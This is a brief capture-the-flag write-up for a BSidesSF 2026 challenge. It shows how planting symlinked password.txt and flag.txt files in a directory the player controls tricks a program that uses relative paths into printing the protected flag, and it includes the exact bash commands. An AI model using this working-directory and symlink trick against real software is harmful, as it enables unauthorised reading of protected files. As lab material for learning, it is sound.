# BSidesSF 2026 CTF - If-It-Leads 

Can you figure out the secret password to print the flag?
Flag Path: /home/ctf/flag.txt
Author: ron

`Web Terminal: 
https://if-it-leads-39d83b0e.term.challenges.bsidessf.net (or socat STDIO,raw,echo=0,escape=0x03 
TCP:if-it-leads-39d83b0e.challenges.bsidessf.net:4445)`
https://if-it-leads-39d83b0e.term.challenges.bsidessf.net

The program uses **relative paths** (`password.txt`, `flag.txt`) and inherits the shell's current working directory. We can supply our own files via symlinks by running from a directory we control.


```bash
cd ~
mkdir exploit_dir && cd exploit_dir

echo "mypassword" > mypass.txt
ln -sf mypass.txt password.txt
ln -sf ../flag.txt flag.txt

../if-it-leads
# Enter: mypassword
```

The program reads our fake `password.txt` (→ `mypass.txt`) and our symlinked `flag.txt` (→ real flag), then prints the flag when the password matches.

